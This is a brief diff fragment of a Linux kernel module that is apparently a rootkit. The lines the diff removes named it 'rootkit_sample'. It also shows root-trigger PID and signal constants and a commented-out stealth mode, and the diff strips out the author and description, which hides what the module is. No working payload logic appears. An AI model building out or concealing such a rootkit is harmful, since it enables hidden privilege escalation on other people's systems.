@@ -12,14 +12,12 @@
 #include <linux/fdtable.h>
 #include <linux/moduleparam.h>
 
-MODULE_AUTHOR("lietdai@gmail.com");
 MODULE_LICENSE("GPL");
-MODULE_DESCRIPTION("rootkit_sample");
 
 #define ROOT_PID 7311
 #define ROOT_SIG 7
 
-static int lpid = 1436;
+static int lpid = 2916;
 module_param(lpid, int, 0);
 
 //#define STEALTH_MODE 1 
